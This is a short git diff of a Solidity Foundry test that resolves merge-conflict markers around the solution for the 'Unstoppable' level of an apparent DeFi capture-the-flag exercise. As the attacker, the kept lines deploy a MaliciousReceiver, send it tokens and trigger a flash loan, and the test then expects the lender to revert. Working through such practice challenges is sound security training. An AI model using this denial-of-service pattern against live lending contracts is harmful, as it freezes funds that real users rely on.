@@ -77,8 +77,6 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-<<<<<<< HEAD:test/Levels/unstoppable/Unstoppable.t.sol
-=======
         vm.startPrank(attacker);
         MaliciousReceiver receiver = new MaliciousReceiver(
             address(unstoppableLender)
@@ -87,7 +85,6 @@ contract Unstoppable is Test {
         dvt.transfer(address(receiver), 100);
         receiver.executeFlashLoan(50);
         vm.stopPrank();
->>>>>>> 3d6ecc3 (stop the unstoppable):src/test/Levels/unstoppable/Unstoppable.t.sol
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
